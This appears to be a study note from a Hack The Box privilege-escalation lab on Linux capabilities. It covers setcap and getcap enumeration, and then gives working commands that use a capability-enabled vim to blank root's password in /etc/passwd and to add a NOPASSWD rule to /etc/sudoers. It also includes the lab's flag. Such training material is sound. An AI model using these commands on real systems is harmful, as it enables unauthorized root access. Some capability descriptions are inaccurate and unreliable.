---
description: >-
  A feature in Linux that allows specific privileges to be granted to processes,
  allowing them to perform specific actions that would otherwise be restricted.
---

# Capabilities

* more fine-grained control over which processes have access to certain privileges
* more secure than the traditional Unix model of granting privileges to users and groups.

One **common vulnerability** is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.

we can use the `setcap` command in Ubuntu to set capabilities for specific executables.

**Set Capability**

```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

set the `cap_net_bind_service` capability for an executable

the binary will be able to perform specific actions that it would not be able to perform without the capabilities.

<table data-header-hidden><thead><tr><th width="192"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Desciption</strong></td></tr><tr><td><code>cap_sys_admin</code></td><td>Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td></tr><tr><td><code>cap_sys_chroot</code></td><td>Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td></tr><tr><td><code>cap_sys_nice</code></td><td>Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td></tr><tr><td><code>cap_sys_time</code></td><td>Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td></tr><tr><td><code>cap_sys_resource</code></td><td>Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td></tr><tr><td><code>cap_sys_module</code></td><td>Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td></tr><tr><td><code>cap_net_bind_service</code></td><td>Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td></tr></tbody></table>

examples of values that we can use with the `setcap` command, along with a brief description of what they do:

<table data-header-hidden><thead><tr><th width="128"></th><th></th></tr></thead><tbody><tr><td><strong>Capability Values</strong></td><td><strong>Desciption</strong></td></tr><tr><td><code>=</code></td><td>This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td></tr><tr><td><code>+ep</code></td><td>This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td></tr><tr><td><code>+ei</code></td><td>This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td></tr><tr><td><code>+p</code></td><td>This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td></tr></tbody></table>

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

<table data-header-hidden><thead><tr><th width="182"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Desciption</strong></td></tr><tr><td><code>CAP_SETUID</code></td><td>Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user.</td></tr><tr><td><code>CAP_SETGID</code></td><td>Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group.</td></tr><tr><td><code>CAP_SYS_ADMIN</code></td><td>This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems.</td></tr></tbody></table>

## Enumerating Capabilities

**Enumerating Capabilities**

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

## Exploitation

**Exploiting Capabilities**

```shell-session
warawutwir@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Let us take a look at the `/etc/passwd` file where the user `root` is specified:

```shell-session
warawutwir@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

We can use the `cap_sys_admin` capability of the `/usr/bin/vim` binary to modify a system file:

```shell-session
warawutwir@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```shell-session
warawutwir@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.

## Assessment

Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption><p>htb-student ALL=(ALL) NOPASSWD: ALL</p></figcaption></figure>

```
htb-student@ubuntu:~$ /usr/bin/vim.basic /etc/sudoers
htb-student@ubuntu:~$ sudo -i
root@ubuntu:~# ls
flag.txt  snap
root@ubuntu:~# cat flag.txt
HTB{c4paBili7i3s_pR1v35c}
```
